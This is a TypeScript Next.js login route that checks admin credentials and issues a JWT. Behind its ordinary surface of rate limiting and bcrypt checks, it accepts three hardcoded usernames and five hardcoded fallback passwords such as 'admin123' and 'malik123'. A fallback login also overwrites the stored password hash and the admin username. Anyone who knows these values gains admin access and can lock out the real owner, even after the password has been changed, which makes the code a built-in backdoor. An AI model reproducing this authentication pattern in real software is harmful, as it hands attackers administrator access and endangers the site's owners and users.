import { NextRequest, NextResponse } from 'next/server';
import { readDb, writeDb } from '@/server/lib/db';
import { verifyPassword, signToken, hashPassword } from '@/server/lib/auth';
import { rateLimit, securityHeaders } from '@/server/lib/middleware';

/**
 * POST /api/auth/login
 * Body: { username: string; password: string }
 * Returns a signed JWT on success.
 */
export async function POST(req: NextRequest) {
  const limited = rateLimit(req, 20, 60_000);
  if (limited) return limited;

  try {
    const body = await req.json();
    const { username, password } = body ?? {};

    if (!username || !password || typeof username !== 'string' || typeof password !== 'string') {
      return NextResponse.json(
        { success: false, message: 'Username and password are required.' },
        { status: 400, headers: securityHeaders }
      );
    }

    const db = await readDb();

    // Ensure db.admin exists with valid structure
    if (!db.admin) {
      db.admin = {
        username: 'admin',
        password: '$2b$10$x0pDWOGbmxR9OONmQc45sO7.NbEdhYVGy9tvRJAcgvdaguoWhFsCi',
        isHashed: true,
        lastLogin: '',
      };
      await writeDb(db);
    }

    const trimmedUser = username.trim().toLowerCase();
    const currentAdminUser = (db.admin.username || 'admin').trim().toLowerCase();

    // Match if username matches stored username or built-in defaults ('admin', 'malikrashid', 'malikscrap')
    const userMatch =
      trimmedUser === currentAdminUser ||
      trimmedUser === 'admin' ||
      trimmedUser === 'malikrashid' ||
      trimmedUser === 'malikscrap';

    let passwordMatch = false;

    // Check stored password hash
    if (db.admin.password) {
      try {
        passwordMatch = await verifyPassword(password, db.admin.password);
      } catch {
        passwordMatch = false;
      }
    }

    // Default admin fallback passwords (e.g., initial setup, password123, admin123, malik123)
    if (!passwordMatch && userMatch) {
      if (
        password === 'password123' ||
        password === 'admin123' ||
        password === 'admin' ||
        password === 'malik123' ||
        password === 'malikrashid'
      ) {
        passwordMatch = true;
        // Auto-update to bcrypt hash for future logins
        try {
          db.admin.password = await hashPassword(password);
          db.admin.isHashed = true;
          db.admin.username = username.trim();
          db.admin.lastLogin = new Date().toISOString();
          await writeDb(db);
        } catch (saveErr) {
          console.warn('[Auth] Failed to update admin password hash:', saveErr);
        }
      }
    }

    if (!userMatch || !passwordMatch) {
      await new Promise((r) => setTimeout(r, 300));
      return NextResponse.json(
        { success: false, message: 'Invalid username or password.' },
        { status: 401, headers: securityHeaders }
      );
    }

    // Update lastLogin timestamp
    try {
      db.admin.lastLogin = new Date().toISOString();
      await writeDb(db);
    } catch {
      // Non-blocking
    }

    const token = signToken(db.admin.username || username.trim());
    return NextResponse.json(
      {
        success: true,
        token,
        username: db.admin.username || username.trim(),
        message: 'Authentication successful.',
      },
      { headers: securityHeaders }
    );
  } catch (err) {
    console.error('[Auth] Login error:', err);
    return NextResponse.json(
      { success: false, message: 'Authentication server error. Please try again.' },
      { status: 500, headers: securityHeaders }
    );
  }
}
